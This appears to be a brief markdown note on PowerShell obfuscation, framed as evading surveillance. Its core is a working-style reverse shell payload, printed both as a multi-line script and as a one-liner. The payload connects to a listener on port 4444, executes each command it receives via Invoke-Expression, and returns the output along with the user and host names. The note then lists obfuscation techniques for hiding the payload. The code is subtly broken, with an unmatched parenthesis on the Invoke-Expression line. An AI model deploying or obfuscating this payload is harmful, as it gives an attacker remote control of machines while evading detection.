# Theory

> Obfuscation is the deliberate addition of ambiguous, confusing, or misleading information to interfere with surveillance and data collection

### Raw Payload

```Powershell
$ReverseShellConnection = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$NetworkStream = $ReverseShellConnection.GetStream()
$ReadBuffer = New-Object Byte[] 65536

while (($BytesRead = $NetworkStream.Read($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {
    $CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)
    $ExecutedOutput = Invoke-Expression $CommandOutput 2>&1) | Out-String
    $PromptWithOutput = $ExecutedOutput + [Environment]::UserName + '@' + [System.Net.Dns]::GetHostName() + ' [' + $(Get-Location) + ']~$ '
    $OutputBytes = [text.encoding]::ASCII.GetBytes($PromptWithOutput)
    $NetworkStream.Write($OutputBytes, 0, $OutputBytes.Length)
    $NetworkStream.Flush()
}

$ReverseShellConnection.Close()
```
or
```Powershell
$ReverseShellConnection = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444);$NetworkStream = $ReverseShellConnection.GetStream();$ReadBuffer = New-Object Byte[] 65536;while (($BytesRead = $NetworkStream.Read($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = Invoke-Expression $CommandOutput 2>&1) | Out-String;$PromptWithOutput = $ExecutedOutput + [Environment]::UserName + '@' + [System.Net.Dns]::GetHostName() + ' [' + $(Get-Location) + ']~$ ';$OutputBytes = [text.encoding]::ASCII.GetBytes($PromptWithOutput);$NetworkStream.Write($OutputBytes, 0, $OutputBytes.Length);$NetworkStream.Flush()};$ReverseShellConnection.Close()
```

### Powershell Obfuscation Methods

<p>Numeric to string conversion obfuscation</p>

<p>Character code obfuscation</p>

<p>String slicing and indexing obfuscation</p>
